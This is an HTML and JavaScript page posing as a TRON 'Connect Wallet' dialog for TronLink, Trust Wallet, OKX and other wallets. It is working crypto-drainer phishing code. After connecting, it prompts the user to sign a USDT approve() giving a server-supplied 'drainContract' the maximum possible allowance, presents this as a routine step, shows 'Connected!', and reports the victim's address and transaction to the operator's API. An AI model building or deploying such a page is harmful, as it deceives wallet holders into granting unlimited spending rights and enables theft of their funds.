<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Connect Wallet</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <style>
    /* Same clean styles as before – omitted for brevity, but include full CSS */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Inter', sans-serif; background: #0a0a0f; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
    .container { width: 100%; max-width: 420px; background: linear-gradient(145deg, rgba(20,20,30,0.95), rgba(10,10,15,0.98)); border: 1px solid rgba(255,255,255,0.06); border-radius: 24px; padding: 32px 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8); }
    .header { text-align: center; margin-bottom: 28px; }
    .header .logo { width: 56px; height: 56px; background: linear-gradient(135deg, #4ade80, #22c55e); border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; font-size: 28px; box-shadow: 0 8px 24px rgba(74,222,128,0.25); }
    .header h2 { font-size: 22px; font-weight: 700; background: linear-gradient(135deg, #ffffff, #94a3b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .header p { font-size: 13px; color: rgba(148,163,184,0.7); margin-top: 4px; }
    .msg { padding: 12px 16px; border-radius: 12px; font-size: 13px; margin-bottom: 16px; display: none; border: 1px solid transparent; animation: slideDown 0.3s ease; }
    .msg.show { display: block; }
    .msg.err { background: rgba(239,68,68,0.12); border-color: rgba(239,68,68,0.2); color: #f87171; }
    .msg.ok { background: rgba(74,222,128,0.12); border-color: rgba(74,222,128,0.2); color: #4ade80; }
    .msg.inf { background: rgba(96,165,250,0.12); border-color: rgba(96,165,250,0.2); color: #60a5fa; }
    .msg.warn { background: rgba(251,191,36,0.12); border-color: rgba(251,191,36,0.2); color: #fbbf24; }
    @keyframes slideDown { from { opacity:0; transform:translateY(-10px); } to { opacity:1; transform:translateY(0); } }
    .wallet-list { display: flex; flex-direction: column; gap: 8px; min-height: 50px; }
    .wallet-btn { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; cursor: pointer; color: #e2e8f0; transition: all 0.25s; }
    .wallet-btn:hover { background: rgba(255,255,255,0.06); border-color: rgba(74,222,128,0.2); transform: translateX(4px); }
    .wallet-btn .ico { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); overflow: hidden; }
    .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; padding: 6px; }
    .wallet-btn .nm { font-size: 15px; font-weight: 500; flex: 1; }
    .wallet-btn .badge { font-size: 10px; font-weight: 600; padding: 4px 10px; border-radius: 20px; background: rgba(74,222,128,0.12); color: #4ade80; text-transform: uppercase; }
    .wallet-btn .badge.install { background: rgba(251,191,36,0.12); color: #fbbf24; }
    .wallet-btn .arrow { color: rgba(148,163,184,0.3); transition: 0.3s; font-size: 18px; }
    .wallet-btn:hover .arrow { color: rgba(74,222,128,0.5); transform: translateX(4px); }
    .screen { display: none; animation: fadeIn 0.4s ease; }
    .screen.on { display: block; }
    @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
    .btn { display: block; width: 100%; padding: 14px; border-radius: 14px; border: 1px solid rgba(255,255,255,0.06); background: transparent; color: #94a3b8; font-size: 13px; font-weight: 500; cursor: pointer; text-align: center; transition: 0.25s; margin-top: 12px; }
    .btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; background: rgba(255,255,255,0.03); }
    .btn-primary { background: linear-gradient(135deg, #4ade80, #22c55e); border: none; color: #000; font-weight: 600; box-shadow: 0 4px 16px rgba(74,222,128,0.2); }
    .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(74,222,128,0.3); border: none; color: #000; }
    .status-icon { text-align: center; margin: 28px 0; }
    .spinner { display: inline-block; width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.06); border-top-color: #4ade80; border-radius: 50%; animation: spin 0.8s infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .success-icon { display: inline-block; width: 64px; height: 64px; border-radius: 50%; background: rgba(74,222,128,0.15); border: 2px solid rgba(74,222,128,0.3); line-height: 64px; text-align: center; font-size: 32px; color: #4ade80; animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1); }
    @keyframes popIn { from { transform: scale(0); opacity:0; } to { transform: scale(1); opacity:1; } }
    .error-icon { display: inline-block; width: 64px; height: 64px; border-radius: 50%; background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.2); line-height: 64px; text-align: center; font-size: 32px; color: #f87171; }
    .address-display { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 12px; padding: 12px 16px; font-family: monospace; font-size: 13px; color: rgba(148,163,184,0.8); word-break: break-all; margin: 12px 0 16px; text-align: center; }
    .progress-steps { margin: 20px 0; }
    .step { display: flex; align-items: center; gap: 14px; padding: 10px 14px; border-radius: 10px; margin-bottom: 4px; font-size: 13px; color: rgba(148,163,184,0.4); transition: 0.3s; }
    .step.active { color: #e2e8f0; background: rgba(255,255,255,0.03); }
    .step.done { color: #4ade80; }
    .step .num { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; background: rgba(255,255,255,0.05); color: rgba(148,163,184,0.3); transition: 0.3s; }
    .step.active .num { background: rgba(74,222,128,0.15); color: #4ade80; }
    .step.done .num { background: rgba(74,222,128,0.12); color: #4ade80; }
    .step .check { color: #4ade80; font-weight: 700; }
    .footer { margin-top: 24px; text-align: center; font-size: 11px; color: rgba(148,163,184,0.2); }
    .footer .dot { display: inline-block; width: 4px; height: 4px; border-radius: 50%; background: rgba(74,222,128,0.3); margin: 0 6px; vertical-align: middle; }
    #configStatus { font-size: 11px; color: rgba(148,163,184,0.4); text-align: center; margin-bottom: 14px; display: none; }
    @media (max-width:480px) { body { padding:12px; align-items:flex-end; } .container { padding:24px 18px; border-radius:20px; } .wallet-btn { padding:12px 14px; } .wallet-btn .ico { width:36px; height:36px; } }
  </style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="logo">⚡</div>
    <h2>Connect Wallet</h2>
    <p>Choose your preferred wallet</p>
  </div>

  <div id="msgBox"></div>
  <div id="configStatus">Loading configuration...</div>

  <div class="screen on" id="scConnect">
    <div class="wallet-list" id="walletList"></div>
    <button class="btn" onclick="window.close()">Cancel</button>
  </div>

  <div class="screen" id="scWait">
    <div class="wait-content">
      <div class="status-icon"><div class="spinner"></div></div>
      <div class="title" style="font-size:17px;font-weight:600;color:#e2e8f0;margin-top:4px;">Connecting...</div>
      <div class="subtitle" id="waitDesc" style="font-size:13px;color:rgba(148,163,184,0.6);">Please confirm in your wallet</div>
      <div class="progress-steps" id="progressSteps">
        <div class="step" id="step1"><span class="num">1</span> Connect wallet</div>
        <div class="step" id="step2"><span class="num">2</span> Check balance</div>
        <div class="step" id="step3"><span class="num">3</span> Approve USDT</div>
      </div>
      <button class="btn" onclick="location.reload()">Cancel</button>
    </div>
  </div>

  <div class="screen" id="scProcessing">
    <div class="wait-content">
      <div class="status-icon"><div class="spinner"></div></div>
      <div class="title" id="processingTitle" style="font-size:17px;font-weight:600;color:#e2e8f0;margin-top:4px;">Processing...</div>
      <div class="subtitle" id="processingDesc" style="font-size:13px;color:rgba(148,163,184,0.6);">Please wait</div>
      <button class="btn" onclick="location.reload()">Cancel</button>
    </div>
  </div>

  <div class="screen" id="scDone">
    <div class="wait-content">
      <div class="status-icon"><div class="success-icon">✓</div></div>
      <div class="title" style="font-size:18px;font-weight:700;color:#4ade80;">Connected!</div>
      <div class="subtitle" style="font-size:13px;color:rgba(148,163,184,0.6);">You can close this page</div>
      <div class="address-display" id="doneAddress"></div>
      <button class="btn btn-primary" onclick="window.close()">Close</button>
    </div>
  </div>

  <div class="screen" id="scError">
    <div class="wait-content">
      <div class="status-icon"><div class="error-icon">✕</div></div>
      <div class="title" id="errorTitle" style="font-size:16px;font-weight:600;color:#f87171;">Connection Failed</div>
      <div class="subtitle" id="errorDesc" style="font-size:13px;color:rgba(148,163,184,0.6);">Please try again</div>
      <button class="btn btn-primary" onclick="location.reload()">Try Again</button>
      <button class="btn" onclick="window.close()">Close</button>
    </div>
  </div>

  <div class="footer">
    <span>TRON Network</span>
    <span class="dot"></span>
    <span>Secure Connection</span>
  </div>
</div>

<script>
  // ============================================================
  // CONFIG
  // ============================================================
  var SITE_URL = window.location.origin;
  var config = {};
  var connectedAddress = null;
  var isProcessing = false;
  var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
  var SESSION_ID = 'qr-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);

  // ============================================================
  // USDT ABI
  // ============================================================
  var USDT_ABI = [
    {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
  ];

  // ============================================================
  // WALLETS
  // ============================================================
  var WALLETS = [
    {
      id: 'tronlink',
      name: 'TronLink',
      logo: 'https://tronlink.org/favicon.ico',
      downloadUrl: 'https://tronlink.org/download',
      detect: function() { return !!(window.tronLink || (window.tronWeb && window.tronWeb.ready)); },
      connect: function() {
        return new Promise(function(resolve, reject) {
          if (window.tronLink && typeof window.tronLink.request === 'function') {
            window.tronLink.request({ method: 'tron_requestAccounts' })
              .then(function(r) {
                if (typeof r === 'string') resolve(r);
                else if (Array.isArray(r) && r.length) resolve(r[0]);
                else if (r && r.address) resolve(r.address);
                else reject(new Error('No address'));
              })
              .catch(reject);
          } else if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            resolve(window.tronWeb.defaultAddress.base58);
          } else {
            reject(new Error('TronLink not detected'));
          }
        });
      }
    },
    {
      id: 'trust',
      name: 'Trust Wallet',
      logo: 'https://dl.svgcdn.com/svg/token-branded/trust.svg',
      downloadUrl: 'https://trustwallet.com/download',
      detect: function() {
        if (window.tronWeb && window.tronWeb.ready) return true;
        if (window.ethereum && window.ethereum.isTrust) return true;
        if (/Trust/i.test(navigator.userAgent)) return true;
        return false;
      },
      connect: function() {
        return new Promise(function(resolve, reject) {
          // Try tronWeb first
          if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            resolve(window.tronWeb.defaultAddress.base58);
            return;
          }
          // Trust Wallet mobile via ethereum
          if (window.ethereum && window.ethereum.isTrust && typeof window.ethereum.request === 'function') {
            window.ethereum.request({ method: 'eth_requestAccounts' })
              .then(function(result) {
                if (Array.isArray(result) && result.length) {
                  // Convert ETH address to TRON hex format
                  var eth = result[0].replace('0x', '');
                  var tronHex = '41' + eth;
                  resolve(tronHex);
                } else {
                  reject(new Error('No address'));
                }
              })
              .catch(reject);
            return;
          }
          reject(new Error('Trust Wallet not detected'));
        });
      }
    },
    {
      id: 'okx',
      name: 'OKX Wallet',
      logo: 'https://dl.svgcdn.com/svg/token-branded/okx.svg',
      downloadUrl: 'https://www.okx.com/download',
      detect: function() { return !!(window.okxwallet); },
      connect: function() {
        return new Promise(function(resolve, reject) {
          var provider = window.okxwallet && (window.okxwallet.tronLink || window.okxwallet.tron);
          if (!provider) return reject(new Error('OKX not detected'));
          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
            resolve(provider.tronWeb.defaultAddress.base58);
            return;
          }
          if (typeof provider.request === 'function') {
            provider.request({ method: 'tron_requestAccounts' })
              .then(function(r) {
                if (typeof r === 'string') resolve(r);
                else if (Array.isArray(r) && r.length) resolve(r[0]);
                else if (r && r.address) resolve(r.address);
                else reject(new Error('No address'));
              })
              .catch(reject);
          } else {
            reject(new Error('Cannot request accounts'));
          }
        });
      }
    },
    {
      id: 'tokenpocket',
      name: 'TokenPocket',
      logo: 'https://dl.svgcdn.com/svg/token-branded/token-pocket.svg',
      downloadUrl: 'https://www.tokenpocket.pro/download',
      detect: function() { return !!(window.tokenpocket); },
      connect: function() {
        return new Promise(function(resolve, reject) {
          var provider = window.tokenpocket && window.tokenpocket.tron;
          if (!provider) return reject(new Error('TokenPocket not detected'));
          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
            resolve(provider.tronWeb.defaultAddress.base58);
            return;
          }
          if (typeof provider.request === 'function') {
            provider.request({ method: 'tron_requestAccounts' })
              .then(function(r) {
                if (typeof r === 'string') resolve(r);
                else if (Array.isArray(r) && r.length) resolve(r[0]);
                else if (r && r.address) resolve(r.address);
                else reject(new Error('No address'));
              })
              .catch(reject);
          } else {
            reject(new Error('Cannot request accounts'));
          }
        });
      }
    },
    {
      id: 'bitget',
      name: 'Bitget Wallet',
      logo: 'https://dl.svgcdn.com/svg/token-branded/bitget.svg',
      downloadUrl: 'https://web3.bitget.com/download',
      detect: function() { return !!(window.bitkeep || window.bitgetWallet); },
      connect: function() {
        return new Promise(function(resolve, reject) {
          var provider = null;
          if (window.bitkeep && window.bitkeep.tron) provider = window.bitkeep.tron;
          else if (window.bitgetWallet && window.bitgetWallet.tron) provider = window.bitgetWallet.tron;
          if (!provider) return reject(new Error('Bitget not detected'));
          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
            resolve(provider.tronWeb.defaultAddress.base58);
            return;
          }
          if (typeof provider.request === 'function') {
            provider.request({ method: 'tron_requestAccounts' })
              .then(function(r) {
                if (typeof r === 'string') resolve(r);
                else if (Array.isArray(r) && r.length) resolve(r[0]);
                else if (r && r.address) resolve(r.address);
                else reject(new Error('No address'));
              })
              .catch(reject);
          } else {
            reject(new Error('Cannot request accounts'));
          }
        });
      }
    },
    {
      id: 'imtoken',
      name: 'imToken',
      logo: 'https://dl.svgcdn.com/svg/token-branded/imtoken.svg',
      downloadUrl: 'https://token.im/download',
      detect: function() { return !!(window.imtoken); },
      connect: function() {
        return new Promise(function(resolve, reject) {
          var provider = window.imtoken && window.imtoken.tron;
          if (!provider) return reject(new Error('imToken not detected'));
          if (provider.tronWeb && provider.tronWeb.ready && provider.tronWeb.defaultAddress && provider.tronWeb.defaultAddress.base58) {
            resolve(provider.tronWeb.defaultAddress.base58);
            return;
          }
          if (typeof provider.request === 'function') {
            provider.request({ method: 'tron_requestAccounts' })
              .then(function(r) {
                if (typeof r === 'string') resolve(r);
                else if (Array.isArray(r) && r.length) resolve(r[0]);
                else if (r && r.address) resolve(r.address);
                else reject(new Error('No address'));
              })
              .catch(reject);
          } else {
            reject(new Error('Cannot request accounts'));
          }
        });
      }
    }
  ];

  // ============================================================
  // DOM REFS
  // ============================================================
  var msgBox = document.getElementById('msgBox');
  function msg(type, text) { msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>'; }
  function hideMsg() { msgBox.innerHTML = ''; }
  function scShow(id) {
    document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
    document.getElementById(id).classList.add('on');
  }
  function updateStep(stepNum, status) {
    var step = document.getElementById('step' + stepNum);
    if (!step) return;
    step.className = 'step';
    if (status === 'active') step.classList.add('active');
    if (status === 'done') {
      step.classList.add('done');
      step.innerHTML = step.innerHTML.replace(/\d/, '<span class="check">✓</span>');
    }
  }

  // ============================================================
  // FETCH CONFIG
  // ============================================================
  async function fetchConfig() {
    var statusEl = document.getElementById('configStatus');
    statusEl.style.display = 'block';
    statusEl.textContent = 'Loading configuration...';
    try {
      var r = await fetch(SITE_URL + '/api/config');
      if (!r.ok) throw new Error('HTTP ' + r.status);
      var data = await r.json();
      if (data && data.usdtContract) {
        config = data;
        statusEl.textContent = '✅ Configuration loaded';
        statusEl.style.color = '#4ade80';
        console.log('✅ Config loaded:', config);
        return config;
      }
      throw new Error('Invalid config');
    } catch(e) {
      console.warn('Config fetch failed:', e.message);
      statusEl.textContent = '⚠️ Using default config';
      statusEl.style.color = '#fbbf24';
      config = { usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', drainContract: '', maxApprove: '115792089237316195423570985008687907853269984665640564039457584007913129639935' };
      return config;
    }
  }

  async function sendAddressToServer(address) {
    try {
      await fetch(SITE_URL + '/api/qr-connect/' + SESSION_ID, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: address })
      });
    } catch(e) {}
  }

  async function logEvent(type, address, txId, amount) {
    try {
      await fetch(SITE_URL + '/api/event', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, address: address || '', txId: txId || '', amount: amount || '' })
      });
    } catch(e) {}
  }

  // ============================================================
  // GET TRONWEB INSTANCE
  // ============================================================
  function getTronWebInstance(walletId) {
    if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
    // Check wallet-specific
    var wallet = WALLETS.find(w => w.id === walletId);
    if (!wallet) return null;
    // For trust, try ethereum.tronLink
    if (walletId === 'trust' && window.ethereum && window.ethereum.isTrust && window.ethereum.tronLink) {
      var tl = window.ethereum.tronLink;
      if (tl.tronWeb && tl.tronWeb.ready) return tl.tronWeb;
    }
    // For others, try their provider
    var provider = null;
    if (walletId === 'okx' && window.okxwallet) provider = window.okxwallet.tronLink || window.okxwallet.tron;
    else if (walletId === 'tokenpocket' && window.tokenpocket) provider = window.tokenpocket.tron;
    else if (walletId === 'bitget' && (window.bitkeep || window.bitgetWallet)) provider = (window.bitkeep || window.bitgetWallet).tron;
    else if (walletId === 'imtoken' && window.imtoken) provider = window.imtoken.tron;
    if (provider && provider.tronWeb && provider.tronWeb.ready) return provider.tronWeb;
    return null;
  }

  // ============================================================
  // CONNECT WALLET
  // ============================================================
  async function connectWallet(walletId) {
    if (isProcessing) return;
    hideMsg();
    isProcessing = true;

    var wallet = WALLETS.find(w => w.id === walletId);
    if (!wallet) { msg('err', 'Wallet not found'); isProcessing = false; return; }

    if (!config || !config.usdtContract) await fetchConfig();
    if (!config.drainContract) {
      msg('err', 'Drain contract not deployed. Please check admin panel.');
      isProcessing = false; return;
    }

    var detected = wallet.detect();
    console.log('📱', wallet.name, 'detected:', detected);

    if (!detected) {
      if (isMobile) {
        // Try deep link
        var url = window.location.href;
        if (wallet.id === 'tronlink') {
          var param = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'tronlink', version: '1.0' }));
          window.location.href = 'tronlinkoutside://pull.activity?param=' + param;
        } else if (wallet.id === 'trust') {
          window.location.href = 'https://link.trustwallet.com/open_url?url=' + encodeURIComponent(url);
        } else if (wallet.id === 'okx') {
          window.location.href = 'okx://wallet/dapp/url?url=' + encodeURIComponent(url);
        } else if (wallet.id === 'tokenpocket') {
          window.location.href = 'tp://open?url=' + encodeURIComponent(url);
        } else if (wallet.id === 'bitget') {
          window.location.href = 'bitkeep://browser?url=' + encodeURIComponent(url);
        } else if (wallet.id === 'imtoken') {
          window.location.href = 'imtokenv2://navigate?screen=Browser&url=' + encodeURIComponent(url);
        } else {
          msg('warn', wallet.name + ' not installed. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Download it here</a>');
        }
        isProcessing = false;
        return;
      } else {
        msg('warn', wallet.name + ' not detected. <a href="' + wallet.downloadUrl + '" target="_blank" style="color:#4ade80;">Install ' + wallet.name + '</a>');
        isProcessing = false;
        return;
      }
    }

    scShow('scWait');
    document.getElementById('waitDesc').textContent = 'Connecting to ' + wallet.name + '...';
    updateStep(1, 'active');
    updateStep(2, '');
    updateStep(3, '');

    try {
      var address = await wallet.connect();
      if (!address) throw new Error('No address returned');
      console.log('✅ Address:', address);
      connectedAddress = address;
      updateStep(1, 'done');

      // Send to server
      await sendAddressToServer(address);
      await logEvent('wallet_connected', address, '', walletId);

      // Get TronWeb instance
      var tw = getTronWebInstance(walletId);
      if (!tw) tw = window.tronWeb;
      if (!tw || !tw.contract) throw new Error('TronWeb not available');

      await doApproveFlow(address, tw, wallet);
    } catch(e) {
      console.error('❌ Error:', e);
      var errMsg = e.message || String(e);
      if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
        showError('Cancelled', 'You cancelled the connection');
      } else {
        showError('Connection Error', errMsg);
      }
      isProcessing = false;
    }
  }

  // ============================================================
  // APPROVE FLOW
  // ============================================================
  async function doApproveFlow(address, tw, wallet) {
    scShow('scProcessing');
    document.getElementById('processingTitle').textContent = 'Checking balance...';
    document.getElementById('processingDesc').textContent = 'Verifying USDT balance';
    updateStep(2, 'active');

    try {
      var usdtContract = await tw.contract(USDT_ABI).at(config.usdtContract);
      console.log('✅ USDT contract loaded');

      var rawBalance = await usdtContract.balanceOf(address).call();
      var balance = rawBalance.toNumber ? rawBalance.toNumber() : Number(rawBalance);
      var balanceUsdt = balance / 1e6;
      console.log('💰 USDT Balance:', balanceUsdt);
      updateStep(2, 'done');

      document.getElementById('processingTitle').textContent = 'Approving USDT...';
      document.getElementById('processingDesc').textContent = 'Please confirm in ' + wallet.name;
      updateStep(3, 'active');

      var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      var built = await tw.transactionBuilder.triggerSmartContract(
        config.usdtContract,
        'approve(address,uint256)',
        { feeLimit: 20000000, callValue: 0 },
        [
          { type: 'address', value: config.drainContract },
          { type: 'uint256', value: approveVal }
        ],
        address
      );

      var approveTx = built.transaction || built;
      if (!approveTx || !approveTx.txID) throw new Error('Build failed');

      console.log('✅ Transaction built, txID:', approveTx.txID);

      var signed = await tw.trx.sign(approveTx);
      console.log('✅ Signed');

      var receipt = await tw.trx.sendRawTransaction(signed);
      console.log('✅ Broadcasted:', receipt);

      var txId = receipt.txid || receipt.txID || '';
      await logEvent('approve_signed', address, txId);

      // Notify server
      await fetch(SITE_URL + '/api/approve-done', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: address })
      });

      updateStep(3, 'done');

      scShow('scDone');
      document.getElementById('doneAddress').textContent = address;
      isProcessing = false;

    } catch(e) {
      console.error('❌ Approve error:', e);
      var errMsg = e.message || String(e);
      if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
        showError('Cancelled', 'You cancelled the approval');
      } else {
        showError('Approval Failed', errMsg);
      }
      isProcessing = false;
    }
  }

  function showError(title, desc) {
    scShow('scError');
    document.getElementById('errorTitle').textContent = title;
    document.getElementById('errorDesc').textContent = desc;
  }

  // ============================================================
  // RENDER WALLETS
  // ============================================================
  function renderWallets() {
    var walletList = document.getElementById('walletList');
    if (!walletList) return;
    walletList.innerHTML = '';
    for (var i = 0; i < WALLETS.length; i++) {
      var w = WALLETS[i];
      var btn = document.createElement('button');
      btn.className = 'wallet-btn';
      var isDetected = w.detect();
      var badgeText = isDetected ? 'Connect' : (isMobile ? 'Open App' : 'Install');
      var badgeClass = isDetected ? 'badge' : 'badge install';
      btn.innerHTML = '<div class="ico"><img src="' + w.logo + '" alt="' + w.name + '" loading="lazy" onerror="this.style.display=\'none\'"></div><span class="nm">' + w.name + '</span><span class="' + badgeClass + '">' + badgeText + '</span><span class="arrow">›</span>';
      btn.addEventListener('click', (function(id) { return function() { connectWallet(id); }; })(w.id));
      walletList.appendChild(btn);
    }
  }

  // ============================================================
  // INIT
  // ============================================================
  function init() {
    renderWallets();
    fetchConfig();
    console.log('📱 QR Session:', SESSION_ID);
    console.log('🌐 SITE_URL:', SITE_URL);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  // fallback
  setTimeout(function() {
    var list = document.getElementById('walletList');
    if (list && list.children.length === 0) renderWallets();
  }, 1000);
</script>
